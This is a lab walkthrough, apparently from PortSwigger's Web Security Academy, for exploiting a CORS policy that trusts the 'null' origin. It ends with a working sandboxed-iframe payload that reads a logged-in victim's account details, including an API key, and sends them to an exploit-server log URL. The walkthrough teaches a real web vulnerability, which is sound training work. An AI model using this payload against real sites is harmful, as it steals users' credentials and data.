- Check intercept is off, then use Burp's browser to log in to your account. Click "My account".
- Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.`
- Observe that the "null" origin is reflected in the `[Access-Control-Allow-Origin](https://portswigger.net/web-security/cors/access-control-allow-origin)` header.
- In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:
    
    `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; </script>"></iframe>`